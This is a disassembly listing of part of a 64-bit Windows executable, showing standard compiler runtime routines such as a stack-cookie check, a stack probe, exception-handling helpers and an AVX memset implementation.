   14000cb1f:	f6 c2 01             	test   $0x1,%dl
   14000cb22:	74 0a                	je     0x14000cb2e
   14000cb24:	ba 18 00 00 00       	mov    $0x18,%edx
   14000cb29:	e8 c2 00 00 00       	call   0x14000cbf0
   14000cb2e:	48 8b c3             	mov    %rbx,%rax
   14000cb31:	48 83 c4 20          	add    $0x20,%rsp
   14000cb35:	5b                   	pop    %rbx
   14000cb36:	c3                   	ret
   14000cb37:	cc                   	int3
   14000cb38:	48 83 ec 28          	sub    $0x28,%rsp
   14000cb3c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000cb40:	48 8b ca             	mov    %rdx,%rcx
   14000cb43:	49 8b d1             	mov    %r9,%rdx
   14000cb46:	e8 0d 00 00 00       	call   0x14000cb58
   14000cb4b:	b8 01 00 00 00       	mov    $0x1,%eax
   14000cb50:	48 83 c4 28          	add    $0x28,%rsp
   14000cb54:	c3                   	ret
   14000cb55:	cc                   	int3
   14000cb56:	cc                   	int3
   14000cb57:	cc                   	int3
   14000cb58:	40 53                	rex push %rbx
   14000cb5a:	45 8b 18             	mov    (%r8),%r11d
   14000cb5d:	48 8b da             	mov    %rdx,%rbx
   14000cb60:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000cb64:	4c 8b c9             	mov    %rcx,%r9
   14000cb67:	41 f6 00 04          	testb  $0x4,(%r8)
   14000cb6b:	4c 8b d1             	mov    %rcx,%r10
   14000cb6e:	74 13                	je     0x14000cb83
   14000cb70:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000cb74:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000cb78:	f7 d8                	neg    %eax
   14000cb7a:	4c 03 d1             	add    %rcx,%r10
   14000cb7d:	48 63 c8             	movslq %eax,%rcx
   14000cb80:	4c 23 d1             	and    %rcx,%r10
   14000cb83:	49 63 c3             	movslq %r11d,%rax
   14000cb86:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000cb8a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000cb8e:	8b 48 08             	mov    0x8(%rax),%ecx
   14000cb91:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000cb95:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000cb9a:	74 0b                	je     0x14000cba7
   14000cb9c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000cba1:	83 e0 f0             	and    $0xfffffff0,%eax
   14000cba4:	4c 03 c8             	add    %rax,%r9
   14000cba7:	4c 33 ca             	xor    %rdx,%r9
   14000cbaa:	49 8b c9             	mov    %r9,%rcx
   14000cbad:	5b                   	pop    %rbx
   14000cbae:	e9 1d 00 00 00       	jmp    0x14000cbd0
   14000cbb3:	cc                   	int3
   14000cbb4:	cc                   	int3
   14000cbb5:	cc                   	int3
   14000cbb6:	cc                   	int3
   14000cbb7:	cc                   	int3
   14000cbb8:	cc                   	int3
   14000cbb9:	cc                   	int3
   14000cbba:	cc                   	int3
   14000cbbb:	cc                   	int3
   14000cbbc:	cc                   	int3
   14000cbbd:	cc                   	int3
   14000cbbe:	cc                   	int3
   14000cbbf:	cc                   	int3
   14000cbc0:	cc                   	int3
   14000cbc1:	cc                   	int3
   14000cbc2:	cc                   	int3
   14000cbc3:	cc                   	int3
   14000cbc4:	cc                   	int3
   14000cbc5:	cc                   	int3
   14000cbc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cbcd:	00 00 00 
   14000cbd0:	48 3b 0d 69 b4 00 00 	cmp    0xb469(%rip),%rcx        # 0x140018040
   14000cbd7:	75 10                	jne    0x14000cbe9
   14000cbd9:	48 c1 c1 10          	rol    $0x10,%rcx
   14000cbdd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   14000cbe2:	75 01                	jne    0x14000cbe5
   14000cbe4:	c3                   	ret
   14000cbe5:	48 c1 c9 10          	ror    $0x10,%rcx
   14000cbe9:	e9 3e 00 00 00       	jmp    0x14000cc2c
   14000cbee:	cc                   	int3
   14000cbef:	cc                   	int3
   14000cbf0:	e9 6b 02 00 00       	jmp    0x14000ce60
   14000cbf5:	cc                   	int3
   14000cbf6:	cc                   	int3
   14000cbf7:	cc                   	int3
   14000cbf8:	40 53                	rex push %rbx
   14000cbfa:	48 83 ec 20          	sub    $0x20,%rsp
   14000cbfe:	48 8b d9             	mov    %rcx,%rbx
   14000cc01:	33 c9                	xor    %ecx,%ecx
   14000cc03:	ff 15 57 14 00 00    	call   *0x1457(%rip)        # 0x14000e060
   14000cc09:	48 8b cb             	mov    %rbx,%rcx
   14000cc0c:	ff 15 46 14 00 00    	call   *0x1446(%rip)        # 0x14000e058
   14000cc12:	ff 15 10 15 00 00    	call   *0x1510(%rip)        # 0x14000e128
   14000cc18:	48 8b c8             	mov    %rax,%rcx
   14000cc1b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   14000cc20:	48 83 c4 20          	add    $0x20,%rsp
   14000cc24:	5b                   	pop    %rbx
   14000cc25:	48 ff 25 0c 15 00 00 	rex.W jmp *0x150c(%rip)        # 0x14000e138
   14000cc2c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000cc31:	48 83 ec 38          	sub    $0x38,%rsp
   14000cc35:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000cc3a:	ff 15 30 14 00 00    	call   *0x1430(%rip)        # 0x14000e070
   14000cc40:	85 c0                	test   %eax,%eax
   14000cc42:	74 07                	je     0x14000cc4b
   14000cc44:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000cc49:	cd 29                	int    $0x29
   14000cc4b:	48 8d 0d 4e cc 00 00 	lea    0xcc4e(%rip),%rcx        # 0x1400198a0
   14000cc52:	e8 a9 00 00 00       	call   0x14000cd00
   14000cc57:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000cc5c:	48 89 05 35 cd 00 00 	mov    %rax,0xcd35(%rip)        # 0x140019998
   14000cc63:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000cc68:	48 83 c0 08          	add    $0x8,%rax
   14000cc6c:	48 89 05 c5 cc 00 00 	mov    %rax,0xccc5(%rip)        # 0x140019938
   14000cc73:	48 8b 05 1e cd 00 00 	mov    0xcd1e(%rip),%rax        # 0x140019998
   14000cc7a:	48 89 05 8f cb 00 00 	mov    %rax,0xcb8f(%rip)        # 0x140019810
   14000cc81:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000cc86:	48 89 05 93 cc 00 00 	mov    %rax,0xcc93(%rip)        # 0x140019920
   14000cc8d:	c7 05 69 cb 00 00 09 	movl   $0xc0000409,0xcb69(%rip)        # 0x140019800
   14000cc94:	04 00 c0 
   14000cc97:	c7 05 63 cb 00 00 01 	movl   $0x1,0xcb63(%rip)        # 0x140019804
   14000cc9e:	00 00 00 
   14000cca1:	c7 05 6d cb 00 00 01 	movl   $0x1,0xcb6d(%rip)        # 0x140019818
   14000cca8:	00 00 00 
   14000ccab:	b8 08 00 00 00       	mov    $0x8,%eax
   14000ccb0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000ccb4:	48 8d 0d 65 cb 00 00 	lea    0xcb65(%rip),%rcx        # 0x140019820
   14000ccbb:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000ccc2:	00 
   14000ccc3:	b8 08 00 00 00       	mov    $0x8,%eax
   14000ccc8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000cccc:	48 8b 0d 6d b3 00 00 	mov    0xb36d(%rip),%rcx        # 0x140018040
   14000ccd3:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000ccd8:	b8 08 00 00 00       	mov    $0x8,%eax
   14000ccdd:	48 6b c0 01          	imul   $0x1,%rax,%rax
   14000cce1:	48 8b 0d 98 b3 00 00 	mov    0xb398(%rip),%rcx        # 0x140018080
   14000cce8:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000cced:	48 8d 0d cc 8a 00 00 	lea    0x8acc(%rip),%rcx        # 0x1400157c0
   14000ccf4:	e8 ff fe ff ff       	call   0x14000cbf8
   14000ccf9:	90                   	nop
   14000ccfa:	48 83 c4 38          	add    $0x38,%rsp
   14000ccfe:	c3                   	ret
   14000ccff:	cc                   	int3
   14000cd00:	40 53                	rex push %rbx
   14000cd02:	56                   	push   %rsi
   14000cd03:	57                   	push   %rdi
   14000cd04:	48 83 ec 40          	sub    $0x40,%rsp
   14000cd08:	48 8b d9             	mov    %rcx,%rbx
   14000cd0b:	ff 15 27 13 00 00    	call   *0x1327(%rip)        # 0x14000e038
   14000cd11:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   14000cd18:	33 ff                	xor    %edi,%edi
   14000cd1a:	45 33 c0             	xor    %r8d,%r8d
   14000cd1d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000cd22:	48 8b ce             	mov    %rsi,%rcx
   14000cd25:	ff 15 15 13 00 00    	call   *0x1315(%rip)        # 0x14000e040
   14000cd2b:	48 85 c0             	test   %rax,%rax
   14000cd2e:	74 39                	je     0x14000cd69
   14000cd30:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000cd36:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000cd3b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000cd40:	4c 8b c8             	mov    %rax,%r9
   14000cd43:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000cd48:	4c 8b c6             	mov    %rsi,%r8
   14000cd4b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000cd50:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000cd55:	33 c9                	xor    %ecx,%ecx
   14000cd57:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000cd5c:	ff 15 e6 12 00 00    	call   *0x12e6(%rip)        # 0x14000e048
   14000cd62:	ff c7                	inc    %edi
   14000cd64:	83 ff 02             	cmp    $0x2,%edi
   14000cd67:	7c b1                	jl     0x14000cd1a
   14000cd69:	48 83 c4 40          	add    $0x40,%rsp
   14000cd6d:	5f                   	pop    %rdi
   14000cd6e:	5e                   	pop    %rsi
   14000cd6f:	5b                   	pop    %rbx
   14000cd70:	c3                   	ret
   14000cd71:	cc                   	int3
   14000cd72:	cc                   	int3
   14000cd73:	cc                   	int3
   14000cd74:	cc                   	int3
   14000cd75:	cc                   	int3
   14000cd76:	cc                   	int3
   14000cd77:	cc                   	int3
   14000cd78:	cc                   	int3
   14000cd79:	cc                   	int3
   14000cd7a:	cc                   	int3
   14000cd7b:	cc                   	int3
   14000cd7c:	cc                   	int3
   14000cd7d:	cc                   	int3
   14000cd7e:	cc                   	int3
   14000cd7f:	cc                   	int3
   14000cd80:	cc                   	int3
   14000cd81:	cc                   	int3
   14000cd82:	cc                   	int3
   14000cd83:	cc                   	int3
   14000cd84:	cc                   	int3
   14000cd85:	cc                   	int3
   14000cd86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cd8d:	00 00 00 
   14000cd90:	48 83 ec 10          	sub    $0x10,%rsp
   14000cd94:	4c 89 14 24          	mov    %r10,(%rsp)
   14000cd98:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000cd9d:	4d 33 db             	xor    %r11,%r11
   14000cda0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000cda5:	4c 2b d0             	sub    %rax,%r10
   14000cda8:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000cdac:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000cdb3:	00 00 
   14000cdb5:	4d 3b d3             	cmp    %r11,%r10
   14000cdb8:	73 16                	jae    0x14000cdd0
   14000cdba:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000cdc0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000cdc7:	41 c6 03 00          	movb   $0x0,(%r11)
   14000cdcb:	4d 3b d3             	cmp    %r11,%r10
   14000cdce:	75 f0                	jne    0x14000cdc0
   14000cdd0:	4c 8b 14 24          	mov    (%rsp),%r10
   14000cdd4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000cdd9:	48 83 c4 10          	add    $0x10,%rsp
   14000cddd:	c3                   	ret
   14000cdde:	cc                   	int3
   14000cddf:	cc                   	int3
   14000cde0:	48 8b c4             	mov    %rsp,%rax
   14000cde3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000cde7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000cdeb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000cdef:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000cdf3:	41 56                	push   %r14
   14000cdf5:	48 83 ec 20          	sub    $0x20,%rsp
   14000cdf9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000cdfd:	48 8b f2             	mov    %rdx,%rsi
   14000ce00:	4d 8b f0             	mov    %r8,%r14
   14000ce03:	48 8b e9             	mov    %rcx,%rbp
   14000ce06:	49 8b d1             	mov    %r9,%rdx
   14000ce09:	48 8b ce             	mov    %rsi,%rcx
   14000ce0c:	49 8b f9             	mov    %r9,%rdi
   14000ce0f:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000ce13:	e8 40 fd ff ff       	call   0x14000cb58
   14000ce18:	8b 45 04             	mov    0x4(%rbp),%eax
   14000ce1b:	24 66                	and    $0x66,%al
   14000ce1d:	f6 d8                	neg    %al
   14000ce1f:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ce24:	45 1b c0             	sbb    %r8d,%r8d
   14000ce27:	41 f7 d8             	neg    %r8d
   14000ce2a:	44 03 c0             	add    %eax,%r8d
   14000ce2d:	44 85 43 04          	test   %r8d,0x4(%rbx)
   14000ce31:	74 11                	je     0x14000ce44
   14000ce33:	4c 8b cf             	mov    %rdi,%r9
   14000ce36:	4d 8b c6             	mov    %r14,%r8
   14000ce39:	48 8b d6             	mov    %rsi,%rdx
   14000ce3c:	48 8b cd             	mov    %rbp,%rcx
   14000ce3f:	e8 c8 5b ff ff       	call   0x140002a0c
   14000ce44:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ce49:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000ce4e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000ce53:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000ce58:	48 83 c4 20          	add    $0x20,%rsp
   14000ce5c:	41 5e                	pop    %r14
   14000ce5e:	c3                   	ret
   14000ce5f:	cc                   	int3
   14000ce60:	e9 e7 87 ff ff       	jmp    0x14000564c
   14000ce65:	cc                   	int3
   14000ce66:	cc                   	int3
   14000ce67:	cc                   	int3
   14000ce68:	cc                   	int3
   14000ce69:	cc                   	int3
   14000ce6a:	cc                   	int3
   14000ce6b:	cc                   	int3
   14000ce6c:	cc                   	int3
   14000ce6d:	cc                   	int3
   14000ce6e:	cc                   	int3
   14000ce6f:	cc                   	int3
   14000ce70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ce75:	57                   	push   %rdi
   14000ce76:	48 83 ec 20          	sub    $0x20,%rsp
   14000ce7a:	49 8b f8             	mov    %r8,%rdi
   14000ce7d:	48 8b d9             	mov    %rcx,%rbx
   14000ce80:	e8 fb 4c ff ff       	call   0x140001b80
   14000ce85:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   14000ce89:	75 0d                	jne    0x14000ce98
   14000ce8b:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000ce91:	75 05                	jne    0x14000ce98
   14000ce93:	83 f8 01             	cmp    $0x1,%eax
   14000ce96:	74 0b                	je     0x14000cea3
   14000ce98:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ce9d:	48 83 c4 20          	add    $0x20,%rsp
   14000cea1:	5f                   	pop    %rdi
   14000cea2:	c3                   	ret
   14000cea3:	e8 84 51 ff ff       	call   0x14000202c
   14000cea8:	48 89 58 20          	mov    %rbx,0x20(%rax)
   14000ceac:	e8 7b 51 ff ff       	call   0x14000202c
   14000ceb1:	48 89 78 28          	mov    %rdi,0x28(%rax)
   14000ceb5:	e8 66 87 ff ff       	call   0x140005620
   14000ceba:	cc                   	int3
   14000cebb:	cc                   	int3
   14000cebc:	cc                   	int3
   14000cebd:	cc                   	int3
   14000cebe:	cc                   	int3
   14000cebf:	cc                   	int3
   14000cec0:	cc                   	int3
   14000cec1:	cc                   	int3
   14000cec2:	cc                   	int3
   14000cec3:	cc                   	int3
   14000cec4:	cc                   	int3
   14000cec5:	cc                   	int3
   14000cec6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cecd:	00 00 00 
   14000ced0:	ff e0                	jmp    *%rax
   14000ced2:	cc                   	int3
   14000ced3:	cc                   	int3
   14000ced4:	cc                   	int3
   14000ced5:	cc                   	int3
   14000ced6:	cc                   	int3
   14000ced7:	cc                   	int3
   14000ced8:	cc                   	int3
   14000ced9:	cc                   	int3
   14000ceda:	cc                   	int3
   14000cedb:	cc                   	int3
   14000cedc:	cc                   	int3
   14000cedd:	cc                   	int3
   14000cede:	cc                   	int3
   14000cedf:	cc                   	int3
   14000cee0:	cc                   	int3
   14000cee1:	cc                   	int3
   14000cee2:	cc                   	int3
   14000cee3:	cc                   	int3
   14000cee4:	cc                   	int3
   14000cee5:	cc                   	int3
   14000cee6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ceed:	00 00 00 
   14000cef0:	ff 25 6a 13 00 00    	jmp    *0x136a(%rip)        # 0x14000e260
   14000cef6:	cc                   	int3
   14000cef7:	cc                   	int3
   14000cef8:	cc                   	int3
   14000cef9:	cc                   	int3
   14000cefa:	cc                   	int3
   14000cefb:	cc                   	int3
   14000cefc:	cc                   	int3
   14000cefd:	cc                   	int3
   14000cefe:	cc                   	int3
   14000ceff:	cc                   	int3
   14000cf00:	cc                   	int3
   14000cf01:	cc                   	int3
   14000cf02:	cc                   	int3
   14000cf03:	cc                   	int3
   14000cf04:	cc                   	int3
   14000cf05:	cc                   	int3
   14000cf06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cf0d:	00 00 00 
   14000cf10:	cc                   	int3
   14000cf11:	cc                   	int3
   14000cf12:	cc                   	int3
   14000cf13:	cc                   	int3
   14000cf14:	cc                   	int3
   14000cf15:	cc                   	int3
   14000cf16:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000cf1d:	00 00 00 
   14000cf20:	57                   	push   %rdi
   14000cf21:	8b c2                	mov    %edx,%eax
   14000cf23:	48 8b f9             	mov    %rcx,%rdi
   14000cf26:	49 8b c8             	mov    %r8,%rcx
   14000cf29:	f3 aa                	rep stos %al,(%rdi)
   14000cf2b:	49 8b c1             	mov    %r9,%rax
   14000cf2e:	5f                   	pop    %rdi
   14000cf2f:	c3                   	ret
   14000cf30:	48 8b c1             	mov    %rcx,%rax
   14000cf33:	4c 8b c9             	mov    %rcx,%r9
   14000cf36:	4c 8d 15 c3 30 ff ff 	lea    -0xcf3d(%rip),%r10        # 0x140000000
   14000cf3d:	0f b6 d2             	movzbl %dl,%edx
   14000cf40:	49 bb 01 01 01 01 01 	movabs $0x101010101010101,%r11
   14000cf47:	01 01 01 
   14000cf4a:	4c 0f af da          	imul   %rdx,%r11
   14000cf4e:	66 49 0f 6e c3       	movq   %r11,%xmm0
   14000cf53:	49 83 f8 0f          	cmp    $0xf,%r8
   14000cf57:	0f 87 83 00 00 00    	ja     0x14000cfe0
   14000cf5d:	0f 1f 00             	nopl   (%rax)
   14000cf60:	49 03 c8             	add    %r8,%rcx
   14000cf63:	47 8b 8c 82 70 59 01 	mov    0x15970(%r10,%r8,4),%r9d
   14000cf6a:	00 
   14000cf6b:	4d 03 ca             	add    %r10,%r9
   14000cf6e:	41 ff e1             	jmp    *%r9
   14000cf71:	4c 89 59 f1          	mov    %r11,-0xf(%rcx)
   14000cf75:	44 89 59 f9          	mov    %r11d,-0x7(%rcx)
   14000cf79:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000cf7e:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000cf82:	c3                   	ret
   14000cf83:	4c 89 59 f2          	mov    %r11,-0xe(%rcx)
   14000cf87:	44 89 59 fa          	mov    %r11d,-0x6(%rcx)
   14000cf8b:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000cf90:	c3                   	ret
   14000cf91:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf98:	0f 1f 84 00 00 00 00 
   14000cf9f:	00 
   14000cfa0:	4c 89 59 f3          	mov    %r11,-0xd(%rcx)
   14000cfa4:	44 89 59 fb          	mov    %r11d,-0x5(%rcx)
   14000cfa8:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000cfac:	c3                   	ret
   14000cfad:	0f 1f 00             	nopl   (%rax)
   14000cfb0:	4c 89 59 f4          	mov    %r11,-0xc(%rcx)
   14000cfb4:	44 89 59 fc          	mov    %r11d,-0x4(%rcx)
   14000cfb8:	c3                   	ret
   14000cfb9:	4c 89 59 f5          	mov    %r11,-0xb(%rcx)
   14000cfbd:	66 44 89 59 fd       	mov    %r11w,-0x3(%rcx)
   14000cfc2:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000cfc6:	c3                   	ret
   14000cfc7:	4c 89 59 f7          	mov    %r11,-0x9(%rcx)
   14000cfcb:	44 88 59 ff          	mov    %r11b,-0x1(%rcx)
   14000cfcf:	c3                   	ret
   14000cfd0:	4c 89 59 f6          	mov    %r11,-0xa(%rcx)
   14000cfd4:	66 44 89 59 fe       	mov    %r11w,-0x2(%rcx)
   14000cfd9:	c3                   	ret
   14000cfda:	4c 89 59 f8          	mov    %r11,-0x8(%rcx)
   14000cfde:	c3                   	ret
   14000cfdf:	90                   	nop
   14000cfe0:	66 0f 6c c0          	punpcklqdq %xmm0,%xmm0
   14000cfe4:	49 83 f8 20          	cmp    $0x20,%r8
   14000cfe8:	77 0c                	ja     0x14000cff6
   14000cfea:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   14000cfee:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000cff5:	c3                   	ret
   14000cff6:	83 3d 23 b0 00 00 03 	cmpl   $0x3,0xb023(%rip)        # 0x140018020
   14000cffd:	0f 82 dd 01 00 00    	jb     0x14000d1e0
   14000d003:	4c 3b 05 1e b0 00 00 	cmp    0xb01e(%rip),%r8        # 0x140018028
   14000d00a:	76 16                	jbe    0x14000d022
   14000d00c:	4c 3b 05 1d b0 00 00 	cmp    0xb01d(%rip),%r8        # 0x140018030
   14000d013:	77 0d                	ja     0x14000d022
   14000d015:	f6 05 2c bb 00 00 02 	testb  $0x2,0xbb2c(%rip)        # 0x140018b48
   14000d01c:	0f 85 fe fe ff ff    	jne    0x14000cf20
   14000d022:	c4 e3 7d 18 c0 01    	vinsertf128 $0x1,%xmm0,%ymm0,%ymm0
   14000d028:	4c 8b c9             	mov    %rcx,%r9
   14000d02b:	49 83 e1 1f          	and    $0x1f,%r9
   14000d02f:	49 83 e9 20          	sub    $0x20,%r9
   14000d033:	49 2b c9             	sub    %r9,%rcx
   14000d036:	49 2b d1             	sub    %r9,%rdx
   14000d039:	4d 03 c1             	add    %r9,%r8
   14000d03c:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d043:	76 65                	jbe    0x14000d0aa
   14000d045:	4c 3b 05 e4 af 00 00 	cmp    0xafe4(%rip),%r8        # 0x140018030
   14000d04c:	0f 87 ce 00 00 00    	ja     0x14000d120
   14000d052:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d059:	1f 84 00 00 00 00 00 
   14000d060:	c5 fd 7f 01          	vmovdqa %ymm0,(%rcx)
   14000d064:	c5 fd 7f 41 20       	vmovdqa %ymm0,0x20(%rcx)
   14000d069:	c5 fd 7f 41 40       	vmovdqa %ymm0,0x40(%rcx)
   14000d06e:	c5 fd 7f 41 60       	vmovdqa %ymm0,0x60(%rcx)
   14000d073:	c5 fd 7f 81 80 00 00 	vmovdqa %ymm0,0x80(%rcx)
   14000d07a:	00 
   14000d07b:	c5 fd 7f 81 a0 00 00 	vmovdqa %ymm0,0xa0(%rcx)
   14000d082:	00 
   14000d083:	c5 fd 7f 81 c0 00 00 	vmovdqa %ymm0,0xc0(%rcx)
   14000d08a:	00 
   14000d08b:	c5 fd 7f 81 e0 00 00 	vmovdqa %ymm0,0xe0(%rcx)
   14000d092:	00 
   14000d093:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000d09a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000d0a1:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d0a8:	73 b6                	jae    0x14000d060
   14000d0aa:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000d0ae:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000d0b2:	4d 8b d9             	mov    %r9,%r11
   14000d0b5:	49 c1 eb 05          	shr    $0x5,%r11
   14000d0b9:	47 8b 9c 9a b0 59 01 	mov    0x159b0(%r10,%r11,4),%r11d
   14000d0c0:	00 
   14000d0c1:	4d 03 da             	add    %r10,%r11
   14000d0c4:	41 ff e3             	jmp    *%r11
   14000d0c7:	c4 a1 7e 7f 84 09 00 	vmovdqu %ymm0,-0x100(%rcx,%r9,1)
   14000d0ce:	ff ff ff 
   14000d0d1:	c4 a1 7e 7f 84 09 20 	vmovdqu %ymm0,-0xe0(%rcx,%r9,1)
   14000d0d8:	ff ff ff 
   14000d0db:	c4 a1 7e 7f 84 09 40 	vmovdqu %ymm0,-0xc0(%rcx,%r9,1)
   14000d0e2:	ff ff ff 
   14000d0e5:	c4 a1 7e 7f 84 09 60 	vmovdqu %ymm0,-0xa0(%rcx,%r9,1)
   14000d0ec:	ff ff ff 
   14000d0ef:	c4 a1 7e 7f 44 09 80 	vmovdqu %ymm0,-0x80(%rcx,%r9,1)
   14000d0f6:	c4 a1 7e 7f 44 09 a0 	vmovdqu %ymm0,-0x60(%rcx,%r9,1)
   14000d0fd:	c4 a1 7e 7f 44 09 c0 	vmovdqu %ymm0,-0x40(%rcx,%r9,1)
   14000d104:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000d10b:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000d10f:	c5 f8 77             	vzeroupper
   14000d112:	c3                   	ret
   14000d113:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d11a:	84 00 00 00 00 00 
   14000d120:	c5 fd e7 01          	vmovntdq %ymm0,(%rcx)
   14000d124:	c5 fd e7 41 20       	vmovntdq %ymm0,0x20(%rcx)
   14000d129:	c5 fd e7 41 40       	vmovntdq %ymm0,0x40(%rcx)
   14000d12e:	c5 fd e7 41 60       	vmovntdq %ymm0,0x60(%rcx)
   14000d133:	c5 fd e7 81 80 00 00 	vmovntdq %ymm0,0x80(%rcx)
   14000d13a:	00 
   14000d13b:	c5 fd e7 81 a0 00 00 	vmovntdq %ymm0,0xa0(%rcx)
   14000d142:	00 
   14000d143:	c5 fd e7 81 c0 00 00 	vmovntdq %ymm0,0xc0(%rcx)
   14000d14a:	00 
   14000d14b:	c5 fd e7 81 e0 00 00 	vmovntdq %ymm0,0xe0(%rcx)
   14000d152:	00 
   14000d153:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000d15a:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000d161:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d168:	73 b6                	jae    0x14000d120
   14000d16a:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000d16e:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000d172:	4d 8b d9             	mov    %r9,%r11
   14000d175:	49 c1 eb 05          	shr    $0x5,%r11
   14000d179:	47 8b 9c 9a d4 59 01 	mov    0x159d4(%r10,%r11,4),%r11d
   14000d180:	00 
   14000d181:	4d 03 da             	add    %r10,%r11
   14000d184:	41 ff e3             	jmp    *%r11
   14000d187:	c4 a1 7d e7 84 09 00 	vmovntdq %ymm0,-0x100(%rcx,%r9,1)
   14000d18e:	ff ff ff 
   14000d191:	c4 a1 7d e7 84 09 20 	vmovntdq %ymm0,-0xe0(%rcx,%r9,1)
   14000d198:	ff ff ff 
   14000d19b:	c4 a1 7d e7 84 09 40 	vmovntdq %ymm0,-0xc0(%rcx,%r9,1)
   14000d1a2:	ff ff ff 
   14000d1a5:	c4 a1 7d e7 84 09 60 	vmovntdq %ymm0,-0xa0(%rcx,%r9,1)
   14000d1ac:	ff ff ff 
   14000d1af:	c4 a1 7d e7 44 09 80 	vmovntdq %ymm0,-0x80(%rcx,%r9,1)
   14000d1b6:	c4 a1 7d e7 44 09 a0 	vmovntdq %ymm0,-0x60(%rcx,%r9,1)
   14000d1bd:	c4 a1 7d e7 44 09 c0 	vmovntdq %ymm0,-0x40(%rcx,%r9,1)
   14000d1c4:	c4 a1 7e 7f 44 01 e0 	vmovdqu %ymm0,-0x20(%rcx,%r8,1)
   14000d1cb:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000d1cf:	0f ae f8             	sfence
   14000d1d2:	c5 f8 77             	vzeroupper
   14000d1d5:	c3                   	ret
